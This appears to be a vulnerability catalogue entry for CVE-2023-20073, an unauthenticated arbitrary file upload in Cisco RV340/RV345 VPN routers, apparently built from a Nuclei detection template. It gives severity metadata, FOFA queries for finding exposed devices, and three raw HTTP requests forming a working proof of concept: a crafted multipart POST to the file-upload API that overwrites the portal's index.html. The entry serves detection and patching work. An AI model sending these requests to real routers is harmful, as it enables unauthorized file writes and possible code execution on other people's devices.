---
layout: "post"
cve_id: "CVE-2023-20073"
title: "Cisco VPN Routers - Unauthenticated Arbitrary File Upload"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-20073.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-20073.yaml"
author: "princechaddha,ritikchaddha"
severity: "critical"
impact: "Successful exploitation of this vulnerability could lead to remote code execution or unauthorized access to sensitive information.
"
remediation: "Apply the latest security patches provided by Cisco to mitigate this vulnerability.
"
reference:
  - "https://unsafe.sh/go-173464.html"
  - "https://gist.github.com/win3zz/076742a4e365b1bba7e2ba0ebea9253f"
  - "https://github.com/RegularITCat/CVE-2023-20073/tree/main"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-20073"
  - "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sb-rv-afu-EXxwA65V"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2023-20073', 'cwe-id': 'CWE-434', 'epss-score': 0.9134, 'epss-percentile': 0.99636, 'cpe': 'cpe:2.3:o:cisco:rv340_firmware:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 3, 'vendor': 'cisco', 'product': 'rv340_firmware', 'fofa-query': ['app="CISCO-RV340" || app="CISCO-RV340W" || app="CISCO-RV345" || app="CISCO-RV345P"', 'app="cisco-rv340" || app="cisco-rv340w" || app="cisco-rv345" || app="cisco-rv345p"']}"
tags:
  - "cve2023"
  - "cve"
  - "xss"
  - "fileupload"
  - "cisco"
  - "unauth"
  - "routers"
  - "vpn"
  - "intrusive"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
A vulnerability in the web-based management interface of Cisco RV340, RV340W, RV345, and RV345P Dual WAN Gigabit VPN Routers could allow an unauthenticated, remote attacker to upload arbitrary files to an affected device. This vulnerability is due to insufficient authorization enforcement mechanisms in the context of file uploads. An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device. A successful exploit could allow the attacker to upload arbitrary files to the affected device.


## üåê HTTP Request
```nohighlight
GET /index.html HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /api/operations/ciscosb-file:form-file-upload HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Connection: close
Content-Length: 568
Authorization: 1
Content-Type: multipart/form-data; boundary=------------------------f6f99e26f3a45adf
Accept-Encoding: gzip

--------------------------f6f99e26f3a45adf
Content-Disposition: form-data; name="pathparam"

Portal
--------------------------f6f99e26f3a45adf
Content-Disposition: form-data; name="fileparam"

index.html
--------------------------f6f99e26f3a45adf
Content-Disposition: form-data; name="file.path"

index.html
--------------------------f6f99e26f3a45adf
Content-Disposition: form-data; name="file"; filename="index.html"
Content-Type: application/octet-stream

clxj6H
<!-- 38BTPC2NNk1mgZzfcrbNAps6MAn -->

--------------------------f6f99e26f3a45adf--
```

```nohighlight
GET /index.html HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)Safari/537.36
Connection: close
Accept-Encoding: gzip
```

